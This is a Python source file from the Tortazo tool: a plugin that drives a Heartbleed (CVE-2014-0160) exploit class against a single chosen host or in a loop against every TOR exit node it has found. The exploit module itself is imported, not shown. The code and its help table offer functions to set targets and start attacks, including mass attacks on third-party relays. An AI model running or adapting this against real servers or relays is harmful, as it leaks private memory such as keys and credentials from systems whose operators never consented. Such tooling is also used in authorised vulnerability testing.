# coding=utf-8
'''
Created on 22/01/2014

#Author: Adastra.
#twitter: @jdaanial

heartBleedPlugin.py

heartBleedPlugin is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

heartBleedPlugin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Tortazo; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
'''

from core.tortazo.pluginManagement.BasePlugin import BasePlugin
from plugins.attack.utils.exploit32745 import HeartBleedExploit
from plugins.texttable import Texttable

class heartBleedPlugin(BasePlugin):
    '''
    Class to  implement a simple plugin which prints the TOR Data structure.
    '''

    def __init__(self, torNodes=[]):
        BasePlugin.__init__(self, torNodes, 'heartBleedPlugin')
        self.setPluginDetails('heartBleedPlugin', 'Performs the HeartBleed vulnerability test against a single target or all TOR exit nodes found.', '1.0', 'Adastra: @jdaanial')
        if len(torNodes) > 0:
            self.info("[*] heartBleedPlugin Initialized!")

        self.pluginConfigs= {}


    def processPluginArguments(self):
        BasePlugin.processPluginArguments(self)


    def __del__(self):
        if len(self.torNodes) > 0:
            self.info("[*] heartBleedPlugin Destroyed!")

    def setTarget(self, relayIp):
        self.hbExploit = HeartBleedExploit(relayIp)
        print "[+] Target %s setted." %(relayIp)


    def setTargetWithPort(self, relayIp, relayPort):
        self.hbExploit = HeartBleedExploit(relayIp, relayPort)
        print "[+] Target %s with port %s setted." %(relayIp,relayPort)

    def startAttack(self):
        self.hbExploit.startAttack()

    def startAttackAllRelays(self):
        for torNode in self.torNodes:
            self.hbExploit = HeartBleedExploit(torNode.host)
            self.hbExploit.startAttack()


    def help(self):
        print "[*] Functions availaible available in the Plugin..."
        table = Texttable()
        table.set_cols_align(["l", "l", "c"])
        table.set_cols_valign(["m", "m", "m"])
        table.set_cols_width([40,55,55])
        table.add_rows([ ["Function", "Description", "Example"],
                         ['help', 'Help Banner', 'self.help()'],
                         ['printRelaysFound', 'Table with the relays found.', 'self.printRelaysFound()'],
                         ['setTarget', 'Set the relay for the HeartBleed attack. Check the targets using the function "printRelaysFound". Default port: 443.', 'self.setTarget("1.2.3.4")'],
                         ['setTargetWithPort', 'Set the relay and port for the HeartBleed attack. Check the targets using the function "printRelaysFound". ', 'self.setTarget("1.2.3.4", "8443")'],
                         ['startAttack', 'Starts the HeartBleed attack against the specified target. ', 'self.startAttack()'],
                         ['startAttackAllRelays', 'Starts the HeartBleed attack against all relays loaded in the plugin. Default port: 443 ', 'self.startAttackAllRelays()']
                        ])
        print table.draw() + "\\n"
